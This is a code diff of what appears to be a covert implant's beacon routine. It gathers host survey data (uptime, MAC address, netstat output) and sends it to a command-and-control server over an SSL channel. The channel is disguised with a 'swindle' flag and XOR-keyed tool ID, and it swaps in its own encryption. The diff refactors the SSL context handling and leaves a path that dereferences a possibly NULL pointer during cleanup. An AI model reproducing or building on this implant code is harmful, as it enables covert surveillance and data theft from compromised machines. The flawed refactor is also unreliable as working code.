@@ -3,13 +3,13 @@
 #include "polarssl/ssl.h"
 #include "polarssl/havege.h"
 #include "polarssl/xtea.h"
+#include "crypto.h"
 #include "beacon.h"
 #include "survey_uptime.h"
 #include "survey_mac.h"
 #include "run_command.h"
 #include "debug.h"
 #include "threads.h"
-#include "crypto.h"
 #include "proj_strings.h"
 #include "compat.h"
 #include "self_delete.h"
@@ -309,12 +309,8 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	unsigned char* netstat_an_data = NULL;
 	unsigned char* next_beacon_data = NULL;
 	
-	//ssl related variables for proxy
-	ssl_context ssl;
-	ssl_session ssn;
+	crypt_context *cc;		// Command and control I/O connection context
 
-	ssl.major_ver = -1;//I'm doing this so that in clean up we only clean
-	                   //up ssl contexts that have been initialized.
 	memset(temp, 0, 1024);
 
 	//MessageBox(NULL,"Let us Begin the Beacon!","OKAY",MB_OK);
@@ -594,7 +590,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 
 	//setup ssl
 	DLX(4, printf("\tSetup crypto\n"));
-	if(crypt_setup_client(&ssl, &ssn, &sock ) != SUCCESS)
+	if ((cc = crypt_setup_client(&sock)) == NULL)
 	{
 		DLX(4, printf("\tERROR: crypt_setup_client()\n"));
 		retval = FAILURE;
@@ -602,13 +598,13 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	}
 
 	//set swindle flag to true
-	ssl.use_custom = 1;
-	ssl.tool_id = TOOL_ID;
-	ssl.xor_key = TOOL_ID_XOR_KEY;
+	cc->ssl->use_custom = 1;
+	cc->ssl->tool_id = TOOL_ID;
+	cc->ssl->xor_key = TOOL_ID_XOR_KEY;
 
 	//perform an SSL handshake
 	DLX(4, printf("\tPerform SSL handshake\n"));
-	if( crypt_handshake(&ssl) != SUCCESS)
+	if (crypt_handshake(cc) != SUCCESS)
 	{
 		DLX(2, printf( "\tERROR: SSL connection with SSL server failed to initialize.\n"));
 			retval = FAILURE;
@@ -618,7 +614,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	DLX(4, printf("\tHandshake Complete!\n"));
 
 	//turn off the ssl encryption since we use our own
-	ssl.do_crypt = 0;
+	cc->ssl->do_crypt = 0;
 
 	//generate 32 random bytes
 	generate_random_bytes(randData,64);
@@ -629,7 +625,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 
 	DLX(4, printf( "\tSending the first 64 bytes with data size encoded in random data\n"));
 	//send the bytes 
-	if( 0 > crypt_write(&ssl, randData,64) )
+	if (crypt_write(cc, randData, 64) < 0)
 	{  //TODO: this is probably no the best check... maybe 32 > cryptwrite
 		retval = FAILURE;
 		goto EXIT;
@@ -674,7 +670,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 		sz_to_send = (encrypt_size - bytes_sent) >= MAX_SSL_PACKET_SIZE ? MAX_SSL_PACKET_SIZE : encrypt_size - bytes_sent;
 		DLX(4, printf("\tSending: %d bytes\n", sz_to_send));
 
-		retval = crypt_write( &ssl, enc_buf + bytes_sent, sz_to_send);
+		retval = crypt_write(cc, enc_buf + bytes_sent, sz_to_send);
 		if( retval < 0) {
 			DLX(4, printf("\tcrypt_write() failed with error: -0x%04x\n", -retval));
 			retval = FAILURE;
@@ -705,10 +701,10 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 
 EXIT:
 	//cleanup
-	if( ssl.major_ver >= 1 )
+	if( cc->ssl->major_ver >= 1 )
 	{
-		crypt_close_notify( &ssl );
-		crypt_cleanup( &ssl );
+		crypt_close_notify(cc);
+		crypt_cleanup(cc);
 	}
 
 	if(mac_data != NULL)
